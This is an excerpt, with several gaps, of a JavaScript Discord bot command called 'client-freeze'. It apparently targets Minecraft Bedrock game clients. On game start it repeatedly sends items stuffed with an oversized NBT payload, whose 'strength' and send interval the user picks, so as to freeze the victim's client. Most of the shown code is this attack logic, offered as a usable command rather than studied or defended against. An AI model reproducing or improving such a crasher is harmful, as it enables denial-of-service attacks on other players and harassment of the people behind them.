...
const { translateDisconnectMessage, cleanLeftovers, fillObjects } = require("../../common/Util.js");
...
module.exports = {
  name: "client-freeze",
  description: 'Freeze a client over with snow',
  ...
  options: [
    ...
    },
    {
      type: 4,
      name: "strength",
      description: "Strength (Higher = Better)",
      required: true,
      min_value: 1,
      max_value: 500000
    },
    {
      type: 4,
      name: "delay",
      description: "Interval delay (Higher = Less Sent) (In Seconds)",
      required: true,
      min_value: 0,
      max_value: 5
    }
  ...
  execute: async (interaction, args, dbUser, embed, clearCooldown) => {
    const { input, time, strength, delay } = args;
    const { user } = interaction;

    if (strength && Object.keys(item.extra.nbt.nbt.value).length != strength) item.extra.nbt.nbt.value = fillObjects(strength, true)
    ...
    client.once("start_game", (packet) => {
      ...
      const sendClientFreeze = () => {
        item.network_id = items[~~(Math.random() * items.length)]

        if (typeof item.network_id === "undefined") return;
      ...
      interval = setInterval(sendClientFreeze, delay * 1000)
